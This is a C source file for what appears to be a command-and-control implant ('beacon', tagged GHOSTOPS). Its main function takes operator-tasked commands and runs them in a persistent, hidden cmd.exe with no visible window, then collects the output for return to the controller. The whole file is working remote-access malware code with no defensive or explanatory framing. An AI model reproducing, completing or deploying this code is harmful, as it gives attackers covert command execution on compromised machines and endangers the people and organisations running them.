#include <beacon.h>
#include <stdio.h>
#include <string.h>

#define SENTINEL        "__GHOSTOPS_EOC__"
#define SENTINEL_CMD    "echo " SENTINEL "\r\n"
#define TIMEOUT_MS      30000
#define POLL_MS         50
#define SHELL_OUT_MAX   (8u * 1024u * 1024u)

static HANDLE g_hProc    = NULL;
static HANDLE g_hStdinW  = NULL;
static HANDLE g_hStdoutR = NULL;

static void shell_close(void) {
    if (g_hProc)    { TerminateProcess(g_hProc, 0); CloseHandle(g_hProc);    g_hProc    = NULL; }
    if (g_hStdinW)  { CloseHandle(g_hStdinW);                                 g_hStdinW  = NULL; }
    if (g_hStdoutR) { CloseHandle(g_hStdoutR);                                g_hStdoutR = NULL; }
}

static BOOL shell_alive(void) {
    return g_hProc && WaitForSingleObject(g_hProc, 0) == WAIT_TIMEOUT;
}

static DWORD shell_read_sentinel(char **buf, DWORD *cap, DWORD timeout_ms) {
    DWORD    total    = 0;
    ULONGLONG deadline = GetTickCount64() + timeout_ms;

    while (GetTickCount64() < deadline) {
        DWORD avail = 0;
        if (!PeekNamedPipe(g_hStdoutR, NULL, 0, NULL, &avail, NULL)) break;
        if (avail == 0) { Sleep(POLL_MS); continue; }

        if (total + avail + 1 > *cap) {
            DWORD new_cap = *cap;
            while (new_cap < total + avail + 1) new_cap *= 2;
            if (new_cap > SHELL_OUT_MAX) new_cap = SHELL_OUT_MAX;
            if (new_cap <= *cap) break;
            char *tmp = (char *)HeapReAlloc(GetProcessHeap(), 0, *buf, new_cap);
            if (!tmp) break;
            *buf = tmp;
            *cap = new_cap;
        }

        DWORD chunk = avail;
        if (total + chunk + 1 > *cap) chunk = *cap - total - 1;
        if (chunk == 0) break;

        DWORD nread = 0;
        if (!ReadFile(g_hStdoutR, *buf + total, chunk, &nread, NULL) || nread == 0) break;
        total += nread;
        (*buf)[total] = '\0';

        if (strstr(*buf, SENTINEL)) break;
    }
    return total;
}

static BOOL shell_spawn(void) {
    HANDLE hStdinR = NULL, hStdoutW = NULL;

    SECURITY_ATTRIBUTES sa;
    memset(&sa, 0, sizeof(sa));
    sa.nLength        = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hStdinR,  &g_hStdinW,  &sa, 0)) goto fail;
    if (!CreatePipe(&g_hStdoutR, &hStdoutW, &sa, 0)) goto fail;

    SetHandleInformation(g_hStdinW,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_hStdoutR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = hStdinR;
    si.hStdOutput  = hStdoutW;
    si.hStdError   = hStdoutW;

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));

    char cmdline[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        goto fail;

    g_hProc = pi.hProcess;
    CloseHandle(pi.hThread);
    CloseHandle(hStdinR);
    CloseHandle(hStdoutW);

    const char *init = "@echo off\r\nprompt\r\n" SENTINEL_CMD;
    DWORD w = 0;
    WriteFile(g_hStdinW, init, (DWORD)strlen(init), &w, NULL);

    DWORD drain_cap = 4096;
    char *drain = (char *)HeapAlloc(GetProcessHeap(), 0, drain_cap);
    if (drain) {
        shell_read_sentinel(&drain, &drain_cap, 5000);
        HeapFree(GetProcessHeap(), 0, drain);
    }
    return TRUE;

fail:
    if (hStdinR)  CloseHandle(hStdinR);
    if (hStdoutW) CloseHandle(hStdoutW);
    shell_close();
    return FALSE;
}

static void shell_ensure(void) {
    if (!shell_alive()) {
        shell_close();
        shell_spawn();
    }
}

void beacon_exec_shell(BEACON_CTX *ctx, PARSED_TASK *task, TASK_RESULT *result) {
    (void)ctx;

    shell_ensure();

    if (!shell_alive()) {
        snprintf(result->error, sizeof(result->error), "failed to spawn shell");
        return;
    }

    const char *cmd    = task->args ? task->args : "";
    DWORD       cmd_ln = task->args ? (DWORD)task->args_len : 0;

    DWORD line_sz = cmd_ln + (DWORD)sizeof(SENTINEL_CMD) + 4;
    char *line = (char *)HeapAlloc(GetProcessHeap(), 0, line_sz);
    if (!line) {
        snprintf(result->error, sizeof(result->error), "out of memory");
        return;
    }
    int line_len = snprintf(line, line_sz, "%s\r\n" SENTINEL_CMD, cmd);

    DWORD written = 0;
    WriteFile(g_hStdinW, line, (DWORD)line_len, &written, NULL);
    HeapFree(GetProcessHeap(), 0, line);

    DWORD total = shell_read_sentinel(&result->output, &result->output_cap, TIMEOUT_MS);

    char *pos = strstr(result->output, SENTINEL);
    if (pos) {
        char *sol = pos;
        while (sol > result->output && sol[-1] != '\n') sol--;
        while (sol > result->output && (sol[-1] == '\r' || sol[-1] == '\n')) sol--;
        *sol = '\0';
        result->output_len = (DWORD)(sol - result->output);
    } else {
        result->output_len = total;
        snprintf(result->error, sizeof(result->error),
                 "timed out after %ds", TIMEOUT_MS / 1000);
    }
}
